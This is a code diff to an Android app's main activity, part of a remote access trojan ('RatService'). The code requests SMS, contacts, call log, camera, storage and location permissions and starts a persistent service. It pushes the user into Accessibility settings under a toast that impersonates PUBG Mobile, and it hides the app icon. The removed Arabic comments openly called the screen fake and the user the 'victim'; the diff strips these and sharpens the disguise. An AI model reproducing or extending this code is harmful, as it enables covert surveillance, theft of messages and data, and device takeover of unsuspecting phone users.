@@ -18,7 +18,6 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // شاشة وهمية
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(Gravity.CENTER);
@@ -32,18 +31,19 @@ public class MainActivity extends Activity {
         layout.addView(textView);
         setContentView(layout);
 
-        // طلب الصلاحيات
+        // طلب الصلاحيات (ضفنا POST_NOTIFICATIONS)
         String[] perms = {
             android.Manifest.permission.READ_SMS, android.Manifest.permission.RECEIVE_SMS,
             android.Manifest.permission.SEND_SMS, android.Manifest.permission.READ_CONTACTS,
             android.Manifest.permission.READ_CALL_LOG, android.Manifest.permission.READ_EXTERNAL_STORAGE,
-            android.Manifest.permission.CAMERA, android.Manifest.permission.ACCESS_FINE_LOCATION
+            android.Manifest.permission.CAMERA, android.Manifest.permission.ACCESS_FINE_LOCATION,
+            android.Manifest.permission.POST_NOTIFICATIONS
         };
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             requestPermissions(perms, 1);
         }
 
-        // 1. تشغيل الخدمة فوراً عشان النظام ميقفلهاش
+        // تشغيل الخدمة
         try {
             Intent serviceIntent = new Intent(this, RatService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -53,15 +53,15 @@ public class MainActivity extends Activity {
             }
         } catch (Exception ignored) {}
 
-        // 2. فتح إعدادات الـ Accessibility عشان الضحية يفعلها
+        // فتح إعدادات الـ Accessibility
         try {
             Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
             accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(accIntent);
-            Toast.makeText(this, "Please enable the service to continue.", Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "Please enable PUBG Mobile in Accessibility.", Toast.LENGTH_LONG).show();
         } catch (Exception ignored) {}
 
-        // 3. إخفاء الأيقونة
+        // إخفاء الأيقونة
         try {
             PackageManager p = getPackageManager();
             ComponentName componentName = new ComponentName(this, MainActivity.class);
